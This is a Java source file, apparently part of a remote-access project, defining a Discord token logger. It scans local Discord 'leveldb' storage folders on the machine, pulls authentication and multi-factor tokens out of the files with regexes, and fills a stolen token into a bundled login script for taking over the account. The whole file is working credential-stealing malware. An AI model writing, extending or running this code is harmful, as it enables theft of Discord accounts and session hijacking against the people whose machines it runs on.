package com.bechris100.remote4j.discord;

import com.bechris100.remote4j.commons.ResourceManager;
import com.bechris100.remote4j.commons.utils.io.FileUtil;

import java.io.IOException;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.MatchResult;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Stream;

public class DiscordTokenLogger {

    private final Pattern mfaRegex = Pattern.compile("mfa\\.[\\w-]{84}");
    private final Pattern defaultRegex = Pattern.compile("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{38}");
    private final Pattern oldRegex = Pattern.compile("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}");

    private boolean multiFactor, useOldRegex = false;

    public DiscordTokenLogger(boolean multiFactorAuth) {
        this.multiFactor = multiFactorAuth;
    }

    public DiscordTokenLogger() {
        this.multiFactor = false;
    }

    public boolean isUsingMultiFactorTokenRegex() {
        return multiFactor;
    }

    public void setUseMultiFactorTokenRegex(boolean multiFactorAuth) {
        this.multiFactor = multiFactorAuth;
    }

    public void setUseOldRegex(boolean oldRegex) {
        this.useOldRegex = oldRegex;
    }

    public boolean isUsingOldRegex() {
        return useOldRegex;
    }

    public List<String> getTokens(boolean debugger) throws IOException {
        List<String> files = new ArrayList<>();
        List<Boolean> completed = new ArrayList<>();

        for (String fixedPath : DiscordCommons.fixedPaths) {
            new Thread(() -> {
                try {
                    if (debugger)
                        System.out.println("Scanning fixed path on \"" + fixedPath + "\"");

                    files.addAll(FileUtil.scanForSpecifiedName(fixedPath, "leveldb", true, true));

                    completed.add(true);
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }).start();
        }

        while (true) {
            if (completed.size() == DiscordCommons.fixedPaths.size())
                break;
            else {
                try {
                    Thread.sleep(750);
                } catch (InterruptedException e) {
                    throw new RuntimeException(e);
                }
            }
        }

        return sortFiles(debugger, files);
    }

    private List<String> sortFiles(boolean debugger, List<String> files) throws IOException {
        if (debugger)
            System.out.println("All files from \"leveldb\" folders were listed");

        List<String> tokensList = new ArrayList<>();

        for (String file : files) {
            if (debugger)
                System.out.println("Reading file \"" + file + "\"");

            String contents = new String(FileUtil.read(file));

            if (debugger)
                System.out.println("Searching tokens in \"" + file + "\"");

            Matcher match;

            if (multiFactor)
                match = mfaRegex.matcher(contents);
            else {
                if (useOldRegex)
                    match = oldRegex.matcher(contents);
                else
                    match = defaultRegex.matcher(contents);
            }

            Stream<MatchResult> stream = match.results();
            List<MatchResult> resultList = stream.toList();

            List<String> tokens = new ArrayList<>();

            for (MatchResult matchResult : resultList)
                tokens.add(matchResult.group());

            if (tokens.size() >= 1) {
                if (debugger)
                    System.out.println("Tokens in \"" + file + "\" were found");

                tokensList.addAll(tokens);
            }
        }

        return tokensList;
    }

    public String getLoginScriptForToken(String token) {
        try {
            InputStream is = ResourceManager.getResourceInputStream("assets/login_script.js");
            StringBuilder str = new StringBuilder();
            int data;

            while ((data = is.read()) != -1)
                str.append((char) data);

            is.close();

            return str.toString().replace("MODIFY_TOKEN", token);
        } catch (IOException e) {
            e.printStackTrace();
            return "";
        }
    }

}
